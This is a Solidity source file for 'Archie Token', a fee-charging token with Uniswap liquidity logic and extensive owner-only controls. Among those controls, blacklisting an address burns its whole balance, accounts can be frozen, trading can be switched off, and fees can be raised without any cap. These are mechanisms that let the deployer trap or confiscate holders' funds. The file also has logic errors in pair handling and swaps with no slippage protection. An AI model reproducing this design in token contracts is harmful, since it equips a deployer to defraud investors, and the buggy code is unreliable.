// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IARC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Archie_Token is Context, IARC20 {
    using SafeMath for uint256;
    mapping (address => uint256) public _balances;
     mapping (address => uint256) public selling;
     mapping (address => uint256) public buying;
     mapping (address=>bool) public  islocked;
     mapping (address=>bool) public  isBlacklisted;



    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcluded;
    // transfer conditions mapping
    
    mapping(address => uint256) private _firstTransfer;
    mapping(address => uint256) private _totTransfers;

    //pancake/uniswap/sunswap selling condition 
    mapping(address => uint256) private _firstSelltime;
    mapping(address => uint256) private _totalAmountSell;

    // pancake/uniswap/sunswap buying condition
    mapping(address => uint256) private _firstBuytime;
    mapping(address => uint256) private _totalAmountBuy;

    // multisendtoken receiver condition
    mapping(address => uint256) private _firstReceivetime;
    mapping(address => uint256) private _totalAmountreceive;



    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    address public marketingwallet;

    uint256 public transfermarketingFee = 5000000000; //5 %
    uint256 public sellmarketingFee = 5000000000;  //5 %
    uint256 public buymarketingFee = 5000000000;    //5 %

    mapping (address => bool) public automatedMarketMakerPairs;
     uint256 public maxwalletamount=50000000 *10**9;
    uint256 public maxTxAmount=50000000 *10 **9;



    uint256 public transferliquidityFee = 5000000000;   //5 %
    uint256 public buyliquidityFee=5000000000;  //5 %
    uint256 public sellliquidityFee=5000000000;  //5 %

    uint256 public numTokensSellToAddToLiquidity = 50000  * 10**9;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public tradingActive;
       modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    






    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

  
       uint256 public maxsellamount=5000000000E9;
       uint256 public maxbuyamount=5000000000E9;
       uint256 public maxTrPerDay = 5000000000E9;
       address public owner;
       uint256 public locktime= 1 days;
      
     



    constructor (address _marketingWallet)  {
        _name = 'Archie Token';
        _symbol = 'ARCHIE';
        _totalSupply = 1000000000e9;
        _decimals = 9;
        _isExcluded[msg.sender]=true;
        _isExcluded[address(this)]=true;
        _isExcluded[uniswapV2Pair]=true;

        marketingwallet=_marketingWallet;

        tradingActive=false;
       

        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x052967739A95D258c44Cf9a79F3135c1291d9fe5);
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;
        automatedMarketMakerPairs[uniswapV2Pair] = true;

              
          owner=msg.sender;
          _balances[owner] = _totalSupply;
                  _paused = false;
        emit Transfer(address(0), owner, _totalSupply);
        
    }

     modifier onlyOwner() {
        require(msg.sender==owner, "Only Call by Owner");
        _;
    }


    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
 

      


    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function pauseContract() public onlyOwner{
        _pause();

    }
    function unpauseContract() public onlyOwner{
        _unpause();

    }

//         
    // 





    

    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual whenNotPaused override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address _owner, address spender) public view virtual override returns (uint256) {
        return _allowances[_owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public whenNotPaused virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ARC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ARC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused virtual {
        require(sender != address(0), "ARC20: transfer from the zero address");
        require(recipient != address(0), "ARC20: transfer to the zero address");
        require(isBlacklisted[sender]==false,"you are blacklisted");
        require(isBlacklisted[recipient]==false,"recipient is blacklisted");
        require(islocked[sender]==false,"you are lockeded");
        require(islocked[recipient]==false,"recipient is lockeded");
        _beforeTokenTransfer(sender, recipient, amount);  
        uint256 contractTokenBalance = balanceOf(address(this));
        
        
        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            sender != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = numTokensSellToAddToLiquidity;
            //add liquidity
            swapAndLiquify(contractTokenBalance);
        }


         if(sender==owner && recipient == uniswapV2Pair  ){
            _balances[sender] = _balances[sender].sub(amount, "ARC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);	
         selling[sender]=selling[sender].add(amount);

        }    

          else if(sender==owner){
            _balances[sender] = _balances[sender].sub(amount, "ARC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
////////////////////////////////////////////////////////////////////////        
                    // Selling limits
// ////////////////////////////////////////////////////////////////////
        else if (recipient == uniswapV2Pair || automatedMarketMakerPairs[recipient] ){
        require(tradingActive==true,"Trading is off!");  
    

        if(_isExcluded[sender]==false ){

        require(amount<=maxTxAmount,"Max Transaction per amount reached");
       
        if(block.timestamp < _firstSelltime[sender].add(locktime)){			 
			
				require(_totalAmountSell[sender]+amount <= maxsellamount, "You can't sell more than maxsellamount 1");
				_totalAmountSell[sender]= _totalAmountSell[sender].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ARC20: sell amount exceeds balance 1");

                _balances[address(this)] = _balances[address(this)].add(calculatesellliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatesellmarketingFee(amount));
                 uint256 remaining=amount.sub((calculatesellliquidityFee(amount).add(calculatesellmarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);
			}  

        else if(block.timestamp>_firstSelltime[sender].add(locktime)){
               _totalAmountSell[sender]=0;
                 require(_totalAmountSell[sender].add(amount) <= maxsellamount, "You can't sell more than maxsellamount 2");
                  _balances[sender] = _balances[sender].sub(amount, "ARC20: sell amount exceeds balance 2");


                 _balances[address(this)] = _balances[address(this)].add(calculatesellliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatesellmarketingFee(amount));
                 uint256 remaining=amount.sub((calculatesellliquidityFee(amount).add(calculatesellmarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);



                _totalAmountSell[sender] =_totalAmountSell[sender].add(amount);
                _firstSelltime[sender]=block.timestamp;
        }
        }
        else{
            _balances[sender] = _balances[sender].sub(amount, "ARC20: selling amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
            _totalAmountSell[sender] =_totalAmountSell[sender].add(amount);
        }

			}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
                              // Buying Condition
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        else if(sender== uniswapV2Pair || automatedMarketMakerPairs[recipient]) {
        require(tradingActive==true,"Trading is off!");    

        if(_isExcluded[recipient]==false ){
        require(amount<=maxTxAmount,"Max Transaction per amount reached");

             uint256 walletcheckamt=amount.sub((calculatebuyliquidityFee(amount).add(calculatebuymarketingFee(amount))));
         require(_balances[recipient].add(walletcheckamt)<=maxwalletamount,"Max receiving limit reached!");


        if(block.timestamp < _firstBuytime[recipient].add(locktime)){			 
			
				require(_totalAmountBuy[recipient]+amount <= maxbuyamount, "You can't sell more than maxbuyamount 1");
				_totalAmountBuy[recipient]= _totalAmountBuy[recipient].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ARC20: buy amount exceeds balance 1");


                 _balances[address(this)] = _balances[address(this)].add(calculatebuyliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatebuymarketingFee(amount));
                 uint256 remaining=amount.sub((calculatebuyliquidityFee(amount).add(calculatebuymarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);
			}  

        else if(block.timestamp>_firstBuytime[recipient].add(locktime)){
               _totalAmountBuy[recipient]=0;
                 require(_totalAmountBuy[recipient].add(amount) <= maxbuyamount, "You can't sell more than maxbuyamount 2");
                  _balances[sender] = _balances[sender].sub(amount, "ARC20: buy amount exceeds balance 2");

                _balances[address(this)] = _balances[address(this)].add(calculatebuyliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatebuymarketingFee(amount));
                 uint256 remaining=amount.sub((calculatebuyliquidityFee(amount).add(calculatebuymarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);

                _totalAmountBuy[recipient] =_totalAmountBuy[recipient].add(amount);
                _firstBuytime[recipient]=block.timestamp;
        }
        }
        else{
            _balances[sender] = _balances[sender].sub(amount, "ARC20: buy amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
            _totalAmountBuy[recipient] =_totalAmountBuy[recipient].add(amount);
        }
            

        }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // exclude receiver
///////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
else if(_isExcluded[recipient]==true )
       {
           _balances[sender] = _balances[sender].sub(amount, "ARC20: simple transfer amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
       }

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                // simple transfer
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       else if(_isExcluded[sender]==false ){
        require(amount<=maxTxAmount,"Max Transaction per amount reached");
        
         uint256 walletcheckamt=amount.sub((calculatetransferliquidityFee(amount).add(calculatetransfermarketingFee(amount))));
         require(_balances[recipient].add(walletcheckamt)<=maxwalletamount,"Max receiving limit reached!");


       if(block.timestamp < _firstTransfer[sender].add(locktime)){			 
			
				require(_totTransfers[sender]+amount <= maxTrPerDay, "You can't transfer more than maxTrPerDay 1");
				_totTransfers[sender]= _totTransfers[sender].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ARC20: transfer amount exceeds balance 1");
                 
                 _balances[address(this)] = _balances[address(this)].add(calculatetransferliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatetransfermarketingFee(amount));
                 uint256 remaining=amount.sub((calculatetransferliquidityFee(amount).add(calculatetransfermarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);
			}  

        else if(block.timestamp>_firstTransfer[sender].add(locktime)){
               _totTransfers[sender]=0;
                 require(_totTransfers[sender].add(amount) <= maxTrPerDay, "You can't transfer more than maxTrPerDay 2");
                  _balances[sender] = _balances[sender].sub(amount, "ARC20: transfer amount exceeds balance 2");
               
                 _balances[address(this)] = _balances[address(this)].add(calculatetransferliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatetransfermarketingFee(amount));
                 uint256 remaining=amount.sub((calculatetransferliquidityFee(amount).add(calculatetransfermarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);

                _totTransfers[sender] =_totTransfers[sender].add(amount);
                _firstTransfer[sender]=block.timestamp;
        }
         else{
            _balances[sender] = _balances[sender].sub(amount, "ARC20: buy amount exceeds balance 2");
               _balances[address(this)] = _balances[address(this)].add(calculatetransferliquidityFee(amount));
                _balances[marketingwallet]=_balances[marketingwallet].add(calculatetransfermarketingFee(amount));
                 uint256 remaining=amount.sub((calculatetransferliquidityFee(amount).add(calculatetransfermarketingFee(amount))));
                _balances[recipient] = _balances[recipient].add(remaining);
        }

             
       }
// ///////////////////////////////////////////////////////////////////////////////////
                            // tranfer for excluded accounts
//////////////////////////////////////////////////////////////////////////////////////
       else if(_isExcluded[sender]==true )
       {
           _balances[sender] = _balances[sender].sub(amount, "ARC20: simple transfer amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
       }
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address _owner, address spender, uint256 amount) internal whenNotPaused virtual {
        require(_owner != address(0), "ARC20: approve from the zero address");
        require(spender != address(0), "ARC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

      function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ARC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal whenNotPaused {
        require(account != address(0), "ARC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function addpairaddress(address _pair) public onlyOwner whenNotPaused{
        uniswapV2Pair=_pair;
    }
        
    function transferownership(address _newonwer) public whenNotPaused onlyOwner{
        owner=_newonwer;
    }

     
    function setbuylimit(uint256 _amount) public onlyOwner whenNotPaused{
    maxbuyamount=_amount*1E9;
    }

      function setmaxsell(uint256 _amount) public whenNotPaused onlyOwner{

        maxsellamount=_amount*1E9;

    }

    function setTransferperdaylimti(uint256 _amount) public onlyOwner whenNotPaused{
        maxTrPerDay=_amount*1E9;
    }

 

    

    function removefromlocked(address _addr) public onlyOwner whenNotPaused{
        islocked[_addr]=false;
    }

     function addtolocked(address _addr) public onlyOwner whenNotPaused{
        islocked[_addr]=true;
    }

    
   
    function addtoblacklisted(address _addr) public onlyOwner whenNotPaused{
        _burn(_addr,balanceOf(_addr));
        isBlacklisted[_addr]=true;
    }

     function removeFromblacklisted(address _addr) public onlyOwner whenNotPaused{
        isBlacklisted[_addr]=false;
    }
 
    
    function withDraw (uint256 _amount) onlyOwner public 
    {
        payable(msg.sender).transfer(_amount);
    }
    
    
    
    function getTokens (uint256 _amount) onlyOwner public 
    {
        _transfer(address(this),msg.sender,_amount);
    }
    function ExcludefromLimits(address _addr,bool _state) public onlyOwner whenNotPaused{
        _isExcluded[_addr]=_state;
    }

    function setTrading(bool _state) external onlyOwner{
        tradingActive=_state;
    }

     function setLiquidityFeePercent(uint256 _transferliquidityFee,uint256 _buyliquidityFee,uint256 _sellliquidityFee) external onlyOwner() {
        transferliquidityFee = _transferliquidityFee;
        buyliquidityFee=_buyliquidityFee;
        sellliquidityFee=_sellliquidityFee;

    }

    

    function calculatebuyliquidityFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(buyliquidityFee).div(
            10**2
        )).div(1e9);
    }

     function calculatesellliquidityFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(sellliquidityFee).div(
            10**2
        )).div(1e9);
    }

    function calculatetransferliquidityFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(transferliquidityFee).div(
            10**2
        )).div(1e9);
    }

    function setMarketingfeepercent(uint256 _transfermarketingFee,uint256  _sellmarketingFee,uint256  _buymarketingFee) external onlyOwner{
        transfermarketingFee=_transfermarketingFee;
        sellmarketingFee=_sellmarketingFee;
        buymarketingFee=_buymarketingFee;
    }

    function calculatetransfermarketingFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(transfermarketingFee).div(
            10**2
        )).div(1e9);
    }

    function calculatesellmarketingFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(sellmarketingFee).div(
            10**2
        )).div(1e9);
    }

    function calculatebuymarketingFee(uint256 _amount) public view returns (uint256) {
        return (_amount.mul(buymarketingFee).div(
            10**2
        )).div(1e9);
    }






       function setAutomatedMarketMakerPairs(address newPair) external onlyOwner() {
       automatedMarketMakerPairs[newPair] = true;
       
       }

    function setnumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external onlyOwner() {
        numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;

    }

    function setmaxwalletamount(uint256 _maxwalletamount) external onlyOwner{
        maxwalletamount=_maxwalletamount;
    }
 function setmaxTxAmount(uint256 _maxTxAmount) external onlyOwner{
        maxTxAmount=_maxTxAmount;
    }

    function setmarketingwallet (address _newmarketingwallet) external onlyOwner{
        marketingwallet=_newmarketingwallet;
    }
    


    function setswapAndLiquifyEnabled(bool _swapAndLiquifyEnabled) external onlyOwner{
        swapAndLiquifyEnabled=_swapAndLiquifyEnabled;
    }

     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
        
     
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
      receive() external payable{
  // your code here…
} 
}